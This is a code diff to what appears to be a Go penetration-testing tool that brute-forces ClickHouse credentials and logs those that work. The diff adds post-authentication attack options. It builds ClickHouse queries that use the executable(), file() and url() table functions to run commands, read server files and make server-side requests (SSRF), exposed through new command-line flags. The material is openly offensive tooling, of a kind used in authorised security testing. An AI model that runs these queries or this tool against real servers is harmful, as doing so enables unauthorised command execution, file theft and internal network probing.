@@ -80,11 +80,22 @@ func (c *ClickhouseCmd) Check(target string) error {
 
 	c.Logger.Found(fmt.Sprintf("Cickhouse: %s - %s:%s", target, c.Opts.Username, c.Opts.Password))
 
-	if c.Opts.Query == "" {
+	var query string
+	switch {
+	case c.Opts.Query != "":
+		query = c.Opts.Query
+	case c.Opts.Command != "":
+		query = fmt.Sprintf("SELECT * FROM executable('%s', 'LineAsString', 'result String')", c.Opts.Command)
+	case c.Opts.File != "":
+		query = fmt.Sprintf("SELECT * FROM file('%s', 'LineAsString', 'result String')", c.Opts.File)
+	case c.Opts.URL != "":
+		// TODO: check if startswith http:// or https://
+		query = fmt.Sprintf("SELECT * FROM url('%s', 'LineAsString', 'result String')", c.Opts.URL)
+	default:
 		return nil
 	}
 
-	rows, err := conn.ExecuteQuery(c.Opts.Query)
+	rows, err := conn.ExecuteQuery(query)
 	if err != nil {
 		c.Logger.Fatal(err.Error())
 		return nil
@@ -117,7 +128,12 @@ func NewCmdClickhouse() *cobra.Command {
 	cmd.Flags().StringVarP(&c.Opts.Password, "password", "p", "", "")
 	cmd.Flags().StringVarP(&c.Opts.Database, "database", "d", "default", "")
 	cmd.Flags().IntVarP(&c.Opts.Timeout, "timeout", "", 5, "")
+
 	cmd.Flags().StringVarP(&c.Opts.Query, "query", "q", "", "SQL query to execute after auth")
+	cmd.Flags().StringVarP(&c.Opts.URL, "ssrf-url", "U", "", "URL for GET SSRF")
+	// TODO: headers
+	cmd.Flags().StringVarP(&c.Opts.File, "read-file", "F", "", "File to read in <user_files_path> configuration folder")
+	cmd.Flags().StringVarP(&c.Opts.Command, "command", "x", "", "Command to execute from <user_scripts_path> configuration folder")
 
 	// Modules
 	c.RegisterModule(modules.NewClickhouseBruteModule(c.Opts, c.Logger))
